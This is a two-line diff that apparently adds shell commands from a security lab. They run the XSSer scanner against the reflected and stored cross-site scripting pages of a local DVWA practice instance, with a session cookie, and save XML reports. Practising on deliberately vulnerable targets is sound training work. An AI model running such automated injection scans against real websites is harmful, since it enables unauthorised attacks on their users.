@@ -1,0 +1,2 @@
+xsser -u "http://127.0.0.1/DVWA/vulnerabilities/xss_r/" -g "?name=XSS" --cookie "security=high;PHPSESSID=flgh47156vsatsbsaae1r4r1nb" --auto --xml "/home/kali/Desktop/whp/results/Report0.xml"
+xsser -u "http://127.0.0.1/DVWA/vulnerabilities/xss_s/" -p "txtName=XSS&mtxMessage=XSS&btnSign=XSS" --cookie "security=high;PHPSESSID=flgh47156vsatsbsaae1r4r1nb" --auto --xml "/home/kali/Desktop/whp/results/Report1.xml"
